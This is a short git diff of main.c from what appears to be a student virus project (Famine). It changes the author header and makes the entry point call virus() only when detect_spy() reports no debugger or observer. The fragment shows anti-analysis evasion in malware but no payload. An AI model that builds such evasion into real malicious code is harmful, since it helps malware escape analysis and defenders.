@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   main.c                                             :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
+/*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 07:23:16 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/12 18:43:19 by jfortin          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,7 +15,8 @@
 
 int	_start(void)
 {
-	virus();
+	if (detect_spy() == false)
+		virus();
 	famine_exit(0);
 	__builtin_unreachable();
 }
